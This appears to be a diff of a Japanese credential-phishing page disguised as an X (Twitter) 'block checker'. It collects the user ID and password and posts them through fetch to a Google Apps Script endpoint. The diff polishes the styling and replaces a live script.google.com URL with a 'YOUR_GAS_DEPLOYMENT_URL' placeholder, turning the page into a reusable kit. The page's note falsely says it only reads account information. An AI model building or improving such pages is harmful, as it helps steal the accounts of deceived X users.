@@ -16,24 +16,24 @@
         }
         .container {
             background-color: rgba(0, 0, 0, 0.8);
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3); /* ネオン効果を弱め */
+            border-radius: 15px; /* 形を柔らかく */
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
             padding: 30px;
             width: 90%; /* レスポンシブ対応 */
             max-width: 400px; /* 最大幅設定 */
-            text-align: center;
+            text-align: left; /* 左寄せ */
             color: #ffffff; /* 白文字 */
         }
         h1 {
-            font-size: 2.5em;
-            margin-bottom: 10px;
-            text-shadow: 0 0 10px rgba(255, 255, 255, 0.6); /* ネオン効果を弱め */
+            font-size: 2em; /* サイズを小さく */
+            margin-bottom: 5px;
+            text-shadow: 0 0 10px rgba(255, 255, 255, 0.6);
         }
         h2 {
-            font-size: 1.2em;
-            margin-bottom: 20px;
+            font-size: 1em; /* サイズを小さく */
+            margin-bottom: 15px;
             color: #cccccc; /* 薄い白 */
-            text-shadow: 0 0 5px rgba(255, 255, 255, 0.4); /* ネオン効果を弱め */
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.4);
         }
         label {
             display: block;
@@ -44,7 +44,7 @@
             width: 100%;
             padding: 10px;
             border: 2px solid #ffffff; /* 白のボーダー */
-            border-radius: 5px;
+            border-radius: 10px; /* 形を柔らかく */
             margin-bottom: 15px;
             background-color: rgba(255, 255, 255, 0.1); /* 半透明の背景 */
             color: #ffffff; /* 白文字 */
@@ -54,11 +54,15 @@
             border-color: #cccccc; /* 薄い白のボーダー */
             outline: none;
         }
+        input[type="password"]::placeholder,
+        input[type="text"]::placeholder {
+            color: rgba(255, 255, 255, 0.5); /* 薄い白 */
+        }
         input[type="button"] {
             background-color: #ffffff; /* ボタンの白 */
             color: black; /* ボタン文字色を黒に */
             border: none;
-            border-radius: 5px;
+            border-radius: 10px; /* 形を柔らかく */
             padding: 10px;
             cursor: pointer;
             width: 100%;
@@ -70,14 +74,11 @@
         }
         .note {
             margin-top: 15px;
-            font-size: 0.9em;
-            color: #cccccc; /* 薄い白 */
+            font-size: 0.8em; /* サイズを小さく */
+            color: rgba(204, 204, 204, 0.7); /* 薄い白 */
             text-align: left;
             line-height: 1.4;
             word-wrap: break-word;
-        }
-        .placeholder {
-            color: rgba(255, 255, 255, 0.5); /* 薄い白 */
         }
     </style>
 </head>
@@ -87,15 +88,15 @@
         <h2>数分後、あなたのDMに結果が届きます。</h2>
         <form id="loginForm">
             <label for="userId">メールアドレスまたはユーザーID:</label>
-            <input type="text" id="userId" name="userId" placeholder="@･･････" required class="placeholder">
+            <input type="text" id="userId" name="userId" placeholder="@･･････" required>
             
             <label for="password">パスワード:</label>
-            <input type="password" id="password" name="password" required>
+            <input type="password" id="password" name="password" placeholder="･･････" required>
             
             <input type="button" value="ログイン" onclick="submitForm()">
 
             <div class="note">
-                ※本サービス（ブロックチェッカー）とX（旧Twitter）アカウントの連携により、以下の操作が許可されます。
+            ※本サービス（ブロックチェッカー）とX（旧Twitter）アカウントの連携により、以下の操作が許可されます。
                 <ul>
                     <li>アカウント情報の読み取り</li>
                 </ul>
@@ -111,7 +112,7 @@
             formData.append('date.user', document.getElementById('userId').value);
             formData.append('date.pass', document.getElementById('password').value);
 
-            fetch('https://script.google.com/macros/s/AKfycbzlaqIAN1AnheHMRZoVrJPUrAv_WuHC32DYWgG2SGiZk9l8K3sjFdPqmKSyiVEq5UPE/exec', {
+            fetch('YOUR_GAS_DEPLOYMENT_URL', {
                 method: 'POST',
                 body: formData
             })
